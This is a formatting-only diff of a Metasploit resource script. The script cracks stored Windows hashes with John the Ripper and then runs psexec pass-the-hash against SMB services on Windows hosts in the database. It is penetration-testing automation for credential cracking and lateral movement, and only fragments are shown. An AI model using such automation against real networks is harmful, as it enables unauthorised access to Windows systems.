@@ -3,7 +3,7 @@
 
 # This Metasploit RC-File could be used to automatically check already discovered windows hashes
 # with jtr before login testing, after jtr is started it uses the hashes with pass the hash
-# against windows fileservices.	-> first we have to fill up the db with operating system infos
+# against windows fileservices. -> first we have to fill up the db with operating system infos
 # we use psexec only against windows systems. Hint: smb_version
 
 
@@ -26,7 +26,7 @@ else
 	jotr = 0
 end
 
-if (framework.datastore['VERBOSE'] == "true")   #we look in the global datastore for a global VERBOSE option and use it
+if (framework.datastore['VERBOSE'] == "true")	#we look in the global datastore for a global VERBOSE option and use it
 	verbose = 1 #true
 else
 	verbose = 0
@@ -54,7 +54,7 @@ framework.db.creds.each do |creds|	# just checking if we have any smb_hashes in 
 		# this is a windows hash 
 		# on the first found hash we are going to analyse all hashes - then we set jotr to 0
 
-	 	print_line("using jtr_crack_fast")
+		print_line("using jtr_crack_fast")
 		run_single("use auxiliary/analyze/jtr_crack_fast")
 		# we use the info from Msf::Config.install_root and append the following path to it (thx to sinn3r)
 		run_single("set JOHN_BASE #{Msf::Config.install_root}/data/john")
@@ -68,14 +68,14 @@ framework.db.creds.each do |creds|	# just checking if we have any smb_hashes in 
 	username = creds.user
 	
 	framework.db.hosts.each do |host|
- 		next if (host.os_name !~ /Windows/)		# pass the hash works just for Win
+		next if (host.os_name !~ /Windows/)		# pass the hash works just for Win
 
-	        host.services.each do |serv|
-	                next if not serv.host
-	                next if (serv.state != ServiceState::Open)
-	                next if (serv.name !~ /smb/) 
-		
-	 		print_line("using psexec - Pass the hash")
+		host.services.each do |serv|
+			next if not serv.host
+			next if (serv.state != ServiceState::Open)
+			next if (serv.name !~ /smb/) 
+
+			print_line("using psexec - Pass the hash")
 			if(verbose == 1)
 				infos(serv,creds,host)
 			end
